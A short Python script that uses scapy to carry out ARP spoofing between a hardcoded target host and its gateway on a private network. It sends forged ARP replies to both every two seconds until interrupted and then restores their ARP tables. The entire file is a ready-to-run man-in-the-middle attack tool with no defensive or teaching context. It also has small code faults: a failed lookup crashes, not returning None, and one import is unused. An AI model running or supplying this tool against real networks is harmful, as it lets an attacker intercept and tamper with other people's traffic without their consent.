#!/usr/bin/env python3

import scapy.all as scapy
import time
from scapy.libs.winpcapy import pcap_set_datalink


def get_mac(ip):
    ip = ip.strip()
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    request_broadcast = broadcast / arp_request
    answer_list = scapy.srp(request_broadcast, timeout=2, verbose=False)[0]

    if len(answer_list) == 0:
        print("[-] not found response: ")

    return answer_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(" [-]  not found mac address: ")
        return

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.253.147"
getway_ip = "192.168.253.2"

try:
    count_send_packet = 0
    while True:
        spoof(target_ip, getway_ip)
        spoof(getway_ip, target_ip)
        count_send_packet += 2
        print(f"\r[+] Packets sent: {count_send_packet}", end=" ")
        time.sleep(2)

except KeyboardInterrupt:
    print("[+] Detected CTRL + C .......Restoring.....please wait.")
    restore(target_ip, getway_ip)
    restore(getway_ip, target_ip)

















